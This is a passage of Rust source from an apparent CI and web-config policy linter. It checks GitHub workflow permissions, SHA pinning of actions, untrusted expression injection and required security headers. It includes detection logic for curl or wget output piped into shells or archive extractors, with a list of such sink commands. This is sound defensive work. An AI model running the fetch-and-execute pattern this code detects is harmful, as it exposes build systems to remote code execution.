    let mut seg_start = if state.flow_step_brace_depth > 0 { Some(0usize) } else { None };
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                if q == b'\'' && bytes.get(i + 1) == Some(&b'\'') {
                    i += 2;
                    continue;
                }
                quote = None;
            }
            i += 1;
            continue;
        }
        match b {
            b'"' | b'\'' => quote = Some(b),
            b'[' => state.flow_steps_bracket_depth += 1,
            b']' => state.flow_steps_bracket_depth = state.flow_steps_bracket_depth.saturating_sub(1),
            b'{' => {
                if state.flow_step_brace_depth == 0 {
                    seg_start = Some(i + 1);
                }
                state.flow_step_brace_depth += 1;
            }
            b'}' if state.flow_step_brace_depth > 0 => {
                state.flow_step_brace_depth -= 1;
                if state.flow_step_brace_depth == 0
                    && let Some(start) = seg_start.take()
                {
                    audit_flow_step_entries(rel, line_no, chunk.get(start..i).unwrap_or(""), state.steps_indent.is_some(), violations);
                }
            }
            _ => {}
        }
        i += 1;
    }
    if let Some(start) = seg_start {
        audit_flow_step_entries(rel, line_no, chunk.get(start..).unwrap_or(""), state.steps_indent.is_some(), violations);
    }
}

fn audit_flow_step_entries(rel: &str, line_no: usize, inner: &str, in_steps: bool, violations: &mut Vec<TelemetryViolation>) {
    for entry in split_yaml_flow_entries(inner) {
        check_workflow_uses_sha(rel, line_no, entry, violations);
        if in_steps {
            if let Some((key, rhs)) = split_yaml_unquoted_key(entry.trim())
                && key == "with"
                && let Some(nested) = rhs.trim().strip_prefix('{').and_then(|s| s.strip_suffix('}'))
            {
                audit_flow_step_entries(rel, line_no, nested, true, violations);
                continue;
            }
            check_inline_flow_run(rel, line_no, entry, violations);
        }
    }
}

fn check_inline_flow_run(rel: &str, line_no: usize, entry: &str, violations: &mut Vec<TelemetryViolation>) {
    let Some((key, rhs)) = split_yaml_unquoted_key(entry.trim()) else {
        return;
    };
    if !matches!(key, "run" | "script" | "prepare") {
        return;
    }
    let val = unquote_scalar(rhs.trim_end_matches([']', '}', ',']).trim());
    if val.is_empty() {
        return;
    }
    let offset_lines = vec![line_no; val.len()];
    flag_untrusted_event_expr_spans(rel, val, &offset_lines, violations);
    flag_remote_script_execution(rel, line_no, val, violations);
}

fn update_workflow_scope(state: &mut WorkflowParseState, indent: usize, trimmed: &str) {
    if state.flow_perm_is_top.is_none() {
        if state.top_perm_indent.is_some_and(|p| indent <= p) {
            state.top_perm_indent = None;
        }
        if state.job_perm_indent.is_some_and(|p| indent <= p) {
            state.job_perm_indent = None;
        }
    }
    if state.steps_indent.is_some_and(|s| {
        state.flow_steps_bracket_depth == 0 && state.flow_step_brace_depth == 0 && (indent < s || (indent == s && !trimmed.starts_with('-')))
    }) {
        state.steps_indent = None;
    }
    if indent == 0 {
        let is_jobs = split_yaml_unquoted_key(trimmed).is_some_and(|(k, rhs)| k == "jobs" && rhs.is_empty());
        state.in_jobs = is_jobs;
        state.jobs_indent = 0;
        if !state.in_jobs {
            state.job_indent = None;
            state.current_job = None;
        }
        return;
    }
    if state.in_jobs && !trimmed.starts_with('-') {
        let expected = state.job_indent.get_or_insert(indent);
        if indent == *expected
            && let Some((job_key, rhs)) = split_yaml_unquoted_key(trimmed)
            && rhs.is_empty()
            && !job_key.contains(char::is_whitespace)
        {
            state.current_job = Some(job_key.to_owned());
            state.steps_indent = None;
            return;
        }
    }
    if !trimmed.starts_with('-')
        && let Some((key, _)) = split_yaml_unquoted_key(trimmed)
        && key == "steps"
    {
        state.steps_indent = Some(indent);
    }
}

fn process_flow_permission_chunk(
    rel: &str,
    line_no: usize,
    chunk: &str,
    is_top: bool,
    state: &mut WorkflowParseState,
    violations: &mut Vec<TelemetryViolation>,
) -> bool {
    let (body, closed) = match find_unquoted_closing_brace(chunk) {
        Some(end) => (chunk.get(..end).unwrap_or(chunk), true),
        None => (chunk, false),
    };
    for entry in split_yaml_flow_entries(body) {
        if let Some((scope, level)) = split_yaml_unquoted_key(entry.trim()) {
            let level_clean = level.trim().trim_end_matches([',', '}']).trim();
            validate_permission_entry(rel, line_no, scope, level_clean, is_top, state, violations);
        }
    }
    closed
}

fn handle_permissions_line(
    rel: &str,
    line_no: usize,
    indent: usize,
    trimmed: &str,
    state: &mut WorkflowParseState,
    violations: &mut Vec<TelemetryViolation>,
) -> bool {
    if let Some(is_top) = state.flow_perm_is_top {
        let closed = process_flow_permission_chunk(rel, line_no, trimmed, is_top, state, violations);
        if closed {
            state.flow_perm_is_top = None;
            if is_top {
                state.top_perm_indent = None;
            } else {
                state.job_perm_indent = None;
            }
        }
        return true;
    }

    if let Some((key, rhs)) = split_yaml_unquoted_key(trimmed)
        && key == "permissions"
    {
        let clean_rhs = unquote_scalar(rhs);
        let is_top = indent == 0;
        if is_top {
            state.saw_top_permissions = true;
            state.top_perm_indent = Some(indent);
        } else {
            state.job_perm_indent = Some(indent);
        }
        if clean_rhs == "write-all" {
            violations.push(TelemetryViolation {
                check: 4,
                path: rel.to_owned(),
                line: line_no,
                detail: String::from("`permissions: write-all` is forbidden"),
            });
            return true;
        }
        if let Some(after_open) = rhs.strip_prefix('{') {
            let closed = process_flow_permission_chunk(rel, line_no, after_open, is_top, state, violations);
            if closed {
                if is_top {
                    state.top_perm_indent = None;
                } else {
                    state.job_perm_indent = None;
                }
            } else {
                state.flow_perm_is_top = Some(is_top);
            }
        }
        return true;
    }

    let perm_scope_is_top = if state.top_perm_indent.is_some_and(|p| indent > p) {
        Some(true)
    } else if state.job_perm_indent.is_some_and(|p| indent > p) {
        Some(false)
    } else {
        None
    };
    if let Some(is_top) = perm_scope_is_top {
        if unquote_scalar(trimmed) == "write-all" {
            violations.push(TelemetryViolation {
                check: 4,
                path: rel.to_owned(),
                line: line_no,
                detail: String::from("`permissions: write-all` is forbidden"),
            });
            return true;
        }
        if let Some(after_open) = trimmed.strip_prefix('{') {
            let closed = process_flow_permission_chunk(rel, line_no, after_open, is_top, state, violations);
            if closed {
                if is_top {
                    state.top_perm_indent = None;
                } else {
                    state.job_perm_indent = None;
                }
            } else {
                state.flow_perm_is_top = Some(is_top);
            }
            return true;
        }
        if let Some((scope, level)) = split_yaml_unquoted_key(trimmed) {
            let level_clean = level.trim().trim_end_matches([',', '}']).trim();
            validate_permission_entry(rel, line_no, scope, level_clean, is_top, state, violations);
            return true;
        }
    }
    false
}

fn validate_permission_entry(
    rel: &str,
    line_no: usize,
    scope: &str,
    level: &str,
    is_top: bool,
    state: &mut WorkflowParseState,
    violations: &mut Vec<TelemetryViolation>,
) {
    let clean_scope = unquote_scalar(scope);
    let clean_level = unquote_scalar(level);
    if is_top && clean_scope == "contents" && clean_level == "read" {
        state.top_has_contents_read = true;
    }
    if clean_level == "write" {
        let publish_ok = !is_top
            && rel == ".github/workflows/release.yml"
            && state.current_job.as_deref() == Some("publish")
            && matches!(clean_scope, "contents" | "id-token" | "attestations");
        let prune_caches_ok =
            !is_top && rel == ".github/workflows/ci.yml" && state.current_job.as_deref() == Some("prune-caches") && clean_scope == "actions";
        // R12.9: the Pages Actions source needs `pages: write` and an OIDC token to deploy the staged site.
        let pages_deploy_ok = !is_top
            && rel == ".github/workflows/pages.yml"
            && state.current_job.as_deref() == Some("deploy")
            && matches!(clean_scope, "pages" | "id-token");
        if !publish_ok && !prune_caches_ok && !pages_deploy_ok {
            violations.push(TelemetryViolation {
                check: 4,
                path: rel.to_owned(),
                line: line_no,
                detail: format!(
                    "unexpected write permission `{clean_scope}: write` \
                     (only release.yml `publish` job may declare `contents: write`, `id-token: write`, or `attestations: write`, \
                     ci.yml `prune-caches` job may declare `actions: write`, \
                     and pages.yml `deploy` job may declare `pages: write` or `id-token: write`)"
                ),
            });
        }
    }
}

fn check_workflow_uses_sha(rel: &str, line_no: usize, code: &str, violations: &mut Vec<TelemetryViolation>) {
    let trimmed = code.trim_start();
    let after_dash = trimmed.strip_prefix('-').map_or(trimmed, str::trim_start);
    let Some((key, rhs)) = split_yaml_unquoted_key(after_dash) else {
        return;
    };
    if key != "uses" {
        return;
    }
    let spec = unquote_scalar(rhs.trim_end_matches([',', '}']).trim());
    if spec.starts_with("./") || spec.starts_with("../") {
        return;
    }
    let valid_sha = spec.split_once('@').is_some_and(|(_, ref_part)| ref_part.len() == 40 && ref_part.bytes().all(|b| b.is_ascii_hexdigit()));
    if !valid_sha {
        violations.push(TelemetryViolation {
            check: 4,
            path: rel.to_owned(),
            line: line_no,
            detail: format!("GitHub Action `{spec}` must be pinned to a full 40-character commit SHA"),
        });
    }
}

fn is_complete_single_line_quoted_scalar(s: &str) -> bool {
    let bytes = s.as_bytes();
    if bytes.len() < 2 {
        return false;
    }
    match bytes[0] {
        b'"' => {
            let mut i = 1usize;
            while i < bytes.len() {
                if bytes[i] == b'\\' {
                    i += 2;
                    continue;
                }
                if bytes[i] == b'"' {
                    return i + 1 == bytes.len();
                }
                i += 1;
            }
            false
        }
        b'\'' => {
            let mut i = 1usize;
            while i < bytes.len() {
                if bytes[i] == b'\'' {
                    if bytes.get(i + 1) == Some(&b'\'') {
                        i += 2;
                        continue;
                    }
                    return i + 1 == bytes.len();
                }
                i += 1;
            }
            false
        }
        _ => false,
    }
}

fn check_run_directive(
    rel: &str,
    line_no: usize,
    indent: usize,
    code: &str,
    state: &mut WorkflowParseState,
    violations: &mut Vec<TelemetryViolation>,
) {
    // Only enter `run_block` inside a `steps:` section (never on a job named `run:`/`script:`/`prepare:`).
    if !state.steps_indent.is_some_and(|s| indent >= s) {
        return;
    }
    let Some((key_col, rhs)) = split_yaml_script_key(code) else {
        return;
    };
    let trimmed_rhs = rhs.trim();
    let effective_rhs =
        if let Some((_, inner_rhs)) = split_yaml_unquoted_key(trimmed_rhs).filter(|(k, _)| *k == "run") { inner_rhs } else { trimmed_rhs };
    if is_yaml_block_scalar(effective_rhs) || effective_rhs.is_empty() {
        state.run_block = Some(RunBlockAccum { key_col, open_quote: None, lines: Vec::new() });
        return;
    }
    let cleaned_rhs = effective_rhs.trim_end_matches(',').trim();
    if is_complete_single_line_quoted_scalar(cleaned_rhs) {
        let val = unquote_scalar(cleaned_rhs);
        let offset_lines = vec![line_no; val.len()];
        flag_untrusted_event_expr_spans(rel, val, &offset_lines, violations);
        flag_remote_script_execution(rel, line_no, val, violations);
        return;
    }
    let (open_quote, first_line) = match cleaned_rhs.as_bytes().first().copied() {
        Some(q @ (b'"' | b'\'')) => (Some(q), cleaned_rhs.get(1..).unwrap_or("")),
        _ => (None, unquote_scalar(cleaned_rhs)),
    };
    let lines = vec![(line_no, first_line.to_owned())];
    state.run_block = Some(RunBlockAccum { key_col, open_quote, lines });
}

fn split_yaml_script_key(code: &str) -> Option<(usize, &str)> {
    let after_indent = code.trim_start_matches(' ');
    let indent = code.len() - after_indent.len();
    let (key_col, after_dash) = if let Some(rest) = after_indent.strip_prefix('-') {
        if !rest.is_empty() && !rest.starts_with(char::is_whitespace) {
            return None;
        }
        let after_extra = rest.trim_start_matches(' ');
        let extra = rest.len() - after_extra.len();
        (indent + 1 + extra, after_extra)
    } else {
        (indent, after_indent)
    };
    let (key, rhs) = split_yaml_unquoted_key(after_dash)?;
    match key {
        "run" | "script" | "prepare" => Some((key_col, rhs)),
        "with" if split_yaml_unquoted_key(rhs.trim_start()).is_some_and(|(k, _)| k == "run") => Some((key_col, rhs)),
        _ => None,
    }
}

fn is_yaml_block_scalar(rhs: &str) -> bool {
    let Some(rest) = rhs.strip_prefix('|').or_else(|| rhs.strip_prefix('>')) else {
        return false;
    };
    rest.chars().all(|c| matches!(c, '-' | '+' | '0'..='9'))
}

/// Find the closing `}}` of a GitHub Actions expression while skipping `'...'` string literals
/// (including escaped `''` inside single-quoted literals).
fn find_gha_expr_close(after_open: &str) -> Option<usize> {
    let bytes = after_open.as_bytes();
    let mut in_sq = false;
    let mut i = 0usize;
    while i < bytes.len() {
        if in_sq {
            if bytes[i] == b'\'' {
                if bytes.get(i + 1) == Some(&b'\'') {
                    i += 2;
                    continue;
                }
                in_sq = false;
            }
            i += 1;
            continue;
        }
        if bytes[i] == b'\'' {
            in_sq = true;
            i += 1;
            continue;
        }
        if bytes.get(i..i + 2) == Some(b"}}") {
            return Some(i);
        }
        i += 1;
    }
    None
}

fn flag_untrusted_event_expr_spans(rel: &str, text: &str, offset_lines: &[usize], violations: &mut Vec<TelemetryViolation>) {
    let mut pos = 0usize;
    while let Some(start_rel) = text.get(pos..).and_then(|s| s.find("${{")) {
        let expr_line = offset_lines.get(pos + start_rel).copied().unwrap_or(1);
        let expr_start = pos + start_rel + 3;
        let after_open = text.get(expr_start..).unwrap_or("");
        let (expr, next_pos) = match find_gha_expr_close(after_open) {
            Some(end) => (after_open.get(..end).unwrap_or(after_open), expr_start + end + 2),
            None => (after_open, text.len()),
        };
        let normalized_bracket = normalize_js_member_syntax(&expr.to_ascii_lowercase());
        let lower_compact: String = normalized_bracket.chars().filter(|c| !c.is_whitespace()).collect();
        if let Some(ref_kind) = untrusted_expr_kind(&lower_compact) {
            violations.push(TelemetryViolation {
                check: 4,
                path: rel.to_owned(),
                line: expr_line,
                detail: format!("untrusted `${{{{ {ref_kind} }}}}` interpolated directly in workflow script block (use `env:` instead)"),
            });
        }
        pos = next_pos;
    }
}

fn untrusted_expr_kind(lower_compact: &str) -> Option<&'static str> {
    for (needle, label, forbid_dot_left) in [
        ("github.event", "github.event.*", false),
        ("inputs", "inputs.*", true),
        ("github.head_ref", "github.head_ref", false),
        ("github.ref_name", "github.ref_name", false),
    ] {
        if has_expr_token(lower_compact, needle, forbid_dot_left) {
            return Some(label);
        }
    }
    None
}

fn has_expr_token(lower_compact: &str, needle: &str, forbid_dot_left: bool) -> bool {
    let bytes = lower_compact.as_bytes();
    let mut pos = 0usize;
    while let Some(rel) = lower_compact.get(pos..).and_then(|s| s.find(needle)) {
        let hit = pos + rel;
        let end = hit + needle.len();
        let left_ok = hit == 0 || (!is_ident_byte(bytes[hit - 1]) && (!forbid_dot_left || bytes[hit - 1] != b'.'));
        let right_ok = end == bytes.len() || !is_ident_byte(bytes[end]);
        if left_ok && right_ok {
            return true;
        }
        pos = hit + 1;
    }
    false
}

/// Split a shell command line into top-level list segments on unquoted `;`, `&&`, or `||`
/// outside `{ ... }` / `( ... )` grouping delimiters.
fn split_shell_lists(cmd: &str) -> Vec<&str> {
    let bytes = cmd.as_bytes();
    let mut out = Vec::new();
    let mut start = 0usize;
    let mut quote: Option<u8> = None;
    let mut brace = 0usize;
    let mut paren = 0usize;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                quote = None;
            }
        } else {
            match b {
                b'"' | b'\'' => quote = Some(b),
                b'{' => brace += 1,
                b'}' => brace = brace.saturating_sub(1),
                b'(' => paren += 1,
                b')' => paren = paren.saturating_sub(1),
                b';' if brace == 0 && paren == 0 => {
                    out.push(cmd.get(start..i).unwrap_or(""));
                    start = i + 1;
                }
                b'&' if brace == 0 && paren == 0 => {
                    if bytes.get(i + 1) == Some(&b'&') {
                        out.push(cmd.get(start..i).unwrap_or(""));
                        start = i + 2;
                        i += 2;
                        continue;
                    }
                    // Split on single `&` background list separator while preserving `|&`, `>&`, `<&`, and `&>`.
                    let prev = i.checked_sub(1).and_then(|p| bytes.get(p).copied());
                    let next = bytes.get(i + 1).copied();
                    if !matches!(prev, Some(b'|' | b'>' | b'<')) && next != Some(b'>') {
                        out.push(cmd.get(start..i).unwrap_or(""));
                        start = i + 1;
                    }
                }
                b'|' if brace == 0 && paren == 0 && bytes.get(i + 1) == Some(&b'|') => {
                    out.push(cmd.get(start..i).unwrap_or(""));
                    start = i + 2;
                    i += 2;
                    continue;
                }
                _ => {}
            }
        }
        i += 1;
    }
    out.push(cmd.get(start..).unwrap_or(""));
    out
}

/// Split a shell pipeline on unquoted `|` or bash `|&` operators (ignoring `||` and grouped subshells).
fn split_shell_pipeline_stages(cmd: &str) -> Vec<&str> {
    let bytes = cmd.as_bytes();
    let mut stages = Vec::new();
    let mut start = 0usize;
    let mut quote: Option<u8> = None;
    let mut brace = 0usize;
    let mut paren = 0usize;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                quote = None;
            }
        } else {
            match b {
                b'"' | b'\'' => quote = Some(b),
                b'{' => brace += 1,
                b'}' => brace = brace.saturating_sub(1),
                b'(' => paren += 1,
                b')' => paren = paren.saturating_sub(1),
                b'|' if brace == 0 && paren == 0 => {
                    if bytes.get(i + 1) == Some(&b'|') {
                        i += 2;
                        continue;
                    }
                    stages.push(cmd.get(start..i).unwrap_or(""));
                    if bytes.get(i + 1) == Some(&b'&') {
                        start = i + 2;
                        i += 2;
                        continue;
                    }
                    start = i + 1;
                }
                _ => {}
            }
        }
        i += 1;
    }
    stages.push(cmd.get(start..).unwrap_or(""));
    stages
}

fn wrapper_flag_takes_arg(wrapper: &str, flag: &str) -> bool {
    match wrapper {
        "sudo" => matches!(
            flag,
            "-u" | "-g" | "-C" | "-h" | "-p" | "-r" | "-t" | "-T" | "-U" | "--user" | "--group" | "--host" | "--prompt" | "--role" | "--type"
        ),
        "env" => matches!(flag, "-u" | "-C" | "-S" | "--unset" | "--chdir" | "--split-string"),
        "timeout" => matches!(flag, "-k" | "-s" | "--kill-after" | "--signal"),
        "nice" => matches!(flag, "-n" | "--adjustment"),
        _ => false,
    }
}

fn short_flag_cluster_expects_next_arg(wrapper: &str, tok: &str) -> bool {
    let Some(cluster) = tok.strip_prefix('-') else {
        return false;
    };
    if cluster.is_empty() || cluster.starts_with('-') || cluster.contains('=') {
        return false;
    }
    let mut chars = cluster.chars().peekable();
    while let Some(ch) = chars.next() {
        let short = format!("-{ch}");
        if wrapper_flag_takes_arg(wrapper, &short) {
            return chars.peek().is_none();
        }
    }
    false
}

/// Extract the executed command basename of a shell pipeline stage (skipping `sudo`/`env`/`command`/
/// `timeout`/`nice` wrappers, wrapper flags + option arguments, and `KEY=val` assignments).
fn pipeline_stage_command_name(stage: &str) -> Option<&str> {
    let mut active_wrapper: Option<&str> = None;
    let mut skip_next_arg = false;
    let mut skip_timeout_duration = false;
    for raw_tok in stage.split_whitespace() {
        let tok = raw_tok.trim_matches(|c| matches!(c, '"' | '\'' | '(' | ')' | '{' | '}' | ';' | '&' | '!'));
        if tok.is_empty() {
            continue;
        }
        if skip_next_arg {
            skip_next_arg = false;
            continue;
        }
        if tok == "--" && active_wrapper.is_some() {
            active_wrapper = None;
            continue;
        }
        if let Some(wrapper) = active_wrapper
            && tok.starts_with('-')
        {
            if !tok.contains('=') && (wrapper_flag_takes_arg(wrapper, tok) || short_flag_cluster_expects_next_arg(wrapper, tok)) {
                skip_next_arg = true;
            }
            continue;
        }
        if skip_timeout_duration {
            skip_timeout_duration = false;
            continue;
        }
        if tok.contains('=') && !tok.starts_with('-') && !tok.starts_with('/') {
            continue;
        }
        let base = tok.rsplit('/').next().unwrap_or(tok);
        if matches!(base, "sudo" | "env" | "command" | "nohup" | "exec" | "time" | "timeout" | "nice") {
            active_wrapper = Some(base);
            if base == "timeout" {
                skip_timeout_duration = true;
            }
            continue;
        }
        return Some(base);
    }
    None
}

fn extract_leading_shell_group(trimmed: &str) -> Option<&str> {
    let bytes = trimmed.as_bytes();
    let (open, close) = match bytes.first().copied()? {
        b'{' => (b'{', b'}'),
        b'(' => (b'(', b')'),
        _ => return None,
    };
    let mut depth = 1usize;
    let mut quote: Option<u8> = None;
    let mut i = 1usize;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b == b'\\' && q == b'"' {
                i += 2;
                continue;
            }
            if b == q {
                quote = None;
            }
        } else if b == b'"' || b == b'\'' {
            quote = Some(b);
        } else if b == open {
            depth += 1;
        } else if b == close {
            depth -= 1;
            if depth == 0 {
                return trimmed.get(1..i);
            }
        }
        i += 1;
    }
    None
}

fn stage_invokes_remote_exec_sink(stage: &str) -> bool {
    let trimmed = stage.trim();
    if let Some(inner) = extract_leading_shell_group(trimmed) {
        return split_shell_lists(inner).into_iter().flat_map(split_shell_pipeline_stages).any(stage_invokes_remote_exec_sink);
    }
    pipeline_stage_command_name(trimmed).is_some_and(is_remote_exec_sink_command)
}

fn is_remote_exec_sink_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish" | "python" | "python3" | "perl" | "ruby" | "node" | "tar" | "bsdtar" | "gtar"
    ) || cmd.starts_with("python3.")
}

fn flag_remote_script_execution(rel: &str, line_no: usize, raw: &str, violations: &mut Vec<TelemetryViolation>) {
    let code = strip_yaml_comment(raw).trim();
    if code.is_empty() || code.starts_with('#') {
        return;
    }
    let lower = code.to_ascii_lowercase();
    if lower.contains("raw.githubusercontent.com/") && (lower.contains("/main/") || lower.contains("/master/") || lower.contains("latest")) {
        violations.push(TelemetryViolation {
            check: 4,
            path: rel.to_owned(),
            line: line_no,
            detail: String::from("unpinned remote script URL off `main`/`master` branch is forbidden in workflows"),
        });
    }
    'lists: for list_item in split_shell_lists(&lower) {
        let stages = split_shell_pipeline_stages(list_item);
        let mut saw_fetcher = false;
        for stage in stages {
            if saw_fetcher && stage_invokes_remote_exec_sink(stage) {
                violations.push(TelemetryViolation {
                    check: 4,
                    path: rel.to_owned(),
                    line: line_no,
                    detail: String::from("piping remote download directly to shell or archive extractor without sha256sum verification is forbidden"),
                });
                break 'lists;
            }
            if contains_telemetry_term(stage, "curl") || contains_telemetry_term(stage, "wget") {
                saw_fetcher = true;
            }
        }
    }
}

/// Check 5: static web security & anti-telemetry headers in `packaging/web/_headers` and `packaging/web/.htaccess`.
fn check_web_security_headers(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
    type Parser = fn(&str) -> (BTreeMap<String, (usize, String)>, Vec<HeaderEntry>);
    let configs: &[(&str, Parser)] = &[("packaging/web/_headers", parse_netlify_header_blocks), ("packaging/web/.htaccess", parse_htaccess_headers)];
    let mut count = 0usize;
    for &(rel, parser) in configs {
        let path = root.join(rel);
        if !path.is_file() {
            push_v(violations, 5, rel, 1, format!("missing {rel}"));
        } else {
            count += 1;
            let text = std::fs::read_to_string(&path).map_err(|e| format!("{rel}: {e}"))?;
            let (global_map, all_entries) = parser(&text);
            validate_required_web_headers(rel, &global_map, &all_entries, violations);
        }
    }
    Ok(count)
}

type HeaderEntry = (String, usize, String);

fn parse_netlify_header_blocks(text: &str) -> (BTreeMap<String, (usize, String)>, Vec<HeaderEntry>) {
    let mut global = BTreeMap::new();
    let mut all = Vec::new();
    let mut in_global = false;
    for (idx, raw) in text.lines().enumerate() {
        let trimmed = raw.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if !raw.starts_with(char::is_whitespace) {
            in_global = trimmed == "/*";
            continue;
        }
        if let Some((name, value)) = trimmed.split_once(':') {
            let key = name.trim().to_ascii_lowercase();
            let val = value.trim().to_owned();
            if in_global {
                global.insert(key.clone(), (idx + 1, val.clone()));
            }
            all.push((key, idx + 1, val));
        }
    }
    (global, all)
}

fn is_scoped_apache_block_tag(tag_name_lower: &str) -> bool {
    matches!(
        tag_name_lower,
        "files"
            | "filesmatch"
            | "location"
            | "locationmatch"
            | "directory"
            | "directorymatch"
            | "if"
            | "elseif"
            | "else"
            | "ifdefine"
            | "ifversion"
            | "ifdirective"
            | "ifsection"
            | "iffile"
            | "limit"
            | "limitexcept"
    )
}

fn parse_htaccess_headers(text: &str) -> (BTreeMap<String, (usize, String)>, Vec<HeaderEntry>) {
    let mut map = BTreeMap::new();
    let mut all = Vec::new();
    let mut block_stack: Vec<(String, bool)> = Vec::new();
    for (idx, raw) in text.lines().enumerate() {
        let trimmed = raw.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if let Some(after_lt) = trimmed.strip_prefix('<') {
            let is_close = after_lt.starts_with('/');
            let body = after_lt.trim_start_matches('/').trim_end_matches('>').trim();
            let (name_raw, args) = body.split_once(char::is_whitespace).unwrap_or((body, ""));
            let name = name_raw.to_ascii_lowercase();
            if is_close {
                if let Some(pos) = block_stack.iter().rposition(|(tag, _)| tag == &name) {
                    block_stack.truncate(pos);
                }
            } else {
                let is_negated_ifmodule = name == "ifmodule" && args.trim_start().trim_start_matches(['"', '\'']).starts_with('!');
                let is_scoped = is_scoped_apache_block_tag(&name) || is_negated_ifmodule;
                block_stack.push((name, is_scoped));
            }
            continue;
        }
        let in_scoped = block_stack.iter().any(|(_, scoped)| *scoped);
        if let Some((action, name, value)) = parse_apache_header_directive(trimmed) {
            let key = name.to_ascii_lowercase();
            if action == "unset" {
                if !in_scoped {
                    map.remove(&key);
                }
                all.push((format!("__unset__:{key}"), idx + 1, value));
            } else if matches!(action.as_str(), "edit" | "edit*" | "merge") {
                all.push((format!("__mutate__:{action}:{key}"), idx + 1, value));
            } else {
                if !in_scoped {
                    map.insert(key.clone(), (idx + 1, value.clone()));
                }
                all.push((key, idx + 1, value));
            }
        }
    }
    (map, all)
}

fn parse_apache_header_directive(trimmed: &str) -> Option<(String, String, String)> {
    let first = next_apache_token(trimmed)?;
    if !unquote_scalar(first.0).eq_ignore_ascii_case("header") {
        return None;
    }
    let mut tok = next_apache_token(first.1)?;
    let cond = unquote_scalar(tok.0);
    if cond.eq_ignore_ascii_case("always") || cond.eq_ignore_ascii_case("onsuccess") {
        tok = next_apache_token(tok.1)?;
    }
    let action = unquote_scalar(tok.0).to_ascii_lowercase();
    if !matches!(action.as_str(), "set" | "setifempty" | "add" | "append" | "unset" | "edit" | "edit*" | "merge") {
        return None;
    }
    let (raw_name, val_part) = next_apache_token(tok.1)?;
    let name = unquote_scalar(raw_name).trim_end_matches(':').trim().to_owned();
    if name.is_empty() {
        return None;
    }
    Some((action, name, unquote_scalar(val_part.trim()).to_owned()))
}

fn next_apache_token(s: &str) -> Option<(&str, &str)> {
    let trimmed = s.trim_start();
    if trimmed.is_empty() {
        return None;
    }
    let bytes = trimmed.as_bytes();
    if matches!(bytes[0], b'"' | b'\'') {
        let q = bytes[0];
        let mut i = 1usize;
        while i < bytes.len() {
            if bytes[i] == b'\\' && q == b'"' && i + 1 < bytes.len() {
                i += 2;
                continue;
            }
            if bytes[i] == q {
                let end = i + 1;
                return trimmed.split_at_checked(end);
            }
            i += 1;
        }
        return Some((trimmed, ""));
    }
    match trimmed.find(char::is_whitespace).and_then(|idx| trimmed.split_at_checked(idx)) {
        Some((tok, rest)) => Some((tok, rest)),
        None => Some((trimmed, "")),
    }
}

fn validate_required_web_headers(
    rel: &str,
    headers: &BTreeMap<String, (usize, String)>,
    all_entries: &[HeaderEntry],
    violations: &mut Vec<TelemetryViolation>,
) {
    const REQUIRED: &[(&str, &str)] = &[
        ("content-security-policy", "missing `Content-Security-Policy` header"),
        ("referrer-policy", "missing `Referrer-Policy: no-referrer` header"),
        ("permissions-policy", "missing `Permissions-Policy` header"),
        ("x-content-type-options", "missing `X-Content-Type-Options: nosniff` header"),
        ("cross-origin-opener-policy", "missing `Cross-Origin-Opener-Policy: same-origin` header"),
        ("cross-origin-embedder-policy", "missing `Cross-Origin-Embedder-Policy: require-corp` header"),
    ];
    const EXACT_VALS: &[(&str, &str, &str)] = &[
        ("referrer-policy", "Referrer-Policy", "no-referrer"),
        ("x-content-type-options", "X-Content-Type-Options", "nosniff"),
        ("cross-origin-opener-policy", "Cross-Origin-Opener-Policy", "same-origin"),
        ("cross-origin-embedder-policy", "Cross-Origin-Embedder-Policy", "require-corp"),
    ];
    for &(key, msg) in REQUIRED {
        if !headers.contains_key(key) {
            push_v(violations, 5, rel, 1, msg);
        }
    }
    for (key, line, val) in all_entries {
        if let Some(unset_hdr) = key.strip_prefix("__unset__:") {
            if REQUIRED.iter().any(|&(req, _)| req == unset_hdr) {
                push_v(violations, 5, rel, *line, format!("forbids `Header ... unset {unset_hdr}` on required security header"));
            }
        } else if let Some(mut_spec) = key.strip_prefix("__mutate__:")
            && let Some((act, hdr)) = mut_spec.split_once(':')
        {
            if REQUIRED.iter().any(|&(req, _)| req == hdr) {
                push_v(violations, 5, rel, *line, format!("forbids `Header ... {act} {hdr}` mutation on required security header"));
            }
        } else if key == "content-security-policy" {
            validate_csp_directives(rel, *line, val, violations);
        } else if key == "permissions-policy" {
            let compact: String = val.chars().filter(|c| !c.is_whitespace()).map(|c| c.to_ascii_lowercase()).collect();
            for feature in ["camera=()", "microphone=()", "geolocation=()"] {
                if !compact.contains(feature) {
                    push_v(violations, 5, rel, *line, format!("`Permissions-Policy` must disable `{feature}`"));
                }
            }
        } else if let Some(&(_, display, expected)) = EXACT_VALS.iter().find(|&&(k, _, _)| k == key)
            && !val.trim().eq_ignore_ascii_case(expected)
        {
            push_v(violations, 5, rel, *line, format!("`{display}` must be `{expected}`, found `{val}`"));
        }
    }
}

fn is_allowed_csp_hash_source(tok: &str) -> bool {
    let Some(inner) = tok.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')) else {
        return false;
    };
    let Some(digest) = inner.strip_prefix("sha256-").or_else(|| inner.strip_prefix("sha384-")).or_else(|| inner.strip_prefix("sha512-")) else {
        return false;
    };
    !digest.is_empty() && digest.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_'))
}

fn is_allowed_csp_source_token(dir_name: &str, tok: &str) -> bool {
    matches!(tok, "'self'" | "'none'" | "'unsafe-inline'" | "'wasm-unsafe-eval'")
        || is_allowed_csp_hash_source(tok)
        || (tok == "data:" && matches!(dir_name, "img-src" | "font-src"))
